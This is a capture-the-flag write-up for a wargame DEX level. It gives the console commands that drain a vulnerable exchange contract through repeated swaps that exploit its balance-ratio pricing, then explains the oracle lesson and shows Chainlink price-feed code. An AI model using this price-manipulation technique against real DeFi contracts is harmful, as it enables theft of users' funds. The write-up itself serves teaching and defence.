Difficulty 3/10

The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation.

You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

### Quick note

Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.

  Things that might help:

-   How is the price of the token calculated?
-   How does the `swap` method work?
-   How do you `approve` a transaction of an ERC20?

```
let t1 = await contract.token1()
let t2 = await contract.token2()

let player_t1 = await contract.balanceOf(t1, player)
let player_t2 = await contract.balanceOf(t2, player)

contract.approve(player, 110)
contract.approve(instance, 110)

contract.swap(t2, t1, player_t1) //mistake but ok
```

then continue to do this until one token reaches 0
```
let player_t1 = await contract.balanceOf(t1, player)

contract.swap(t1, t2, player_t1)

let player_t2 = await contract.balanceOf(t2, player)

contract.swap(t2, t1, player_t2)
```

after _ _ rounds the swap fails and we have:
|-|token1|token2|
|---|---|---|
|dex|45|110|
|player|65|0|

in the `swap()` function, the dex will calculate `swap_amount` using `get_swap_price`:
```
swap_amount = (x * from) / to
```

we want `swap_amount = 110` so solving for x:
```
110 = (x * 110) / 45
x = 45
```

one more swap: `contract.swap(t1, t2, 45)`
and we can check the dex: 
```javascript
await contract.balanceOf(t2, instance)
	o {negative: 0, words: Array(2), length: 1, red: null}
	length: 1
	negative: 0
	red: null
	words: Array(2)
	0: 0 // <- 0
	length: 2
	[[Prototype]]: Array(0)
	[[Prototype]]: Object
```

End:
Level completed!
Difficulty 3/10

The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. This is why we need oracles. Oracles are ways to get data into and out of smart contracts. We should be getting our data from multiple independent decentralized sources, otherwise we can run this risk.

Chainlink Data Feeds are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer secure randomness, ability to make any API call, modular oracle network creation, upkeep, actions, and maintainance, and unlimited customization.

Uniswap TWAP Oracles relies on a time weighted price model called TWAP. While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.

Here is an example of getting data from a Chainlink data feed (on the kovan testnet):


pragma solidity ^0.6.7;

import "@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol";

```
contract PriceConsumerV3 {

    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Kovan
     * Aggregator: ETH/USD
     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331
     */
    constructor() public {
        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);
    }

    /**
     * Returns the latest price
     */
    function getLatestPrice() public view returns (int) {
        (
            uint80 roundID, 
            int price,
            uint startedAt,
            uint timeStamp,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        return price;
    }
}
```
Try it on Remix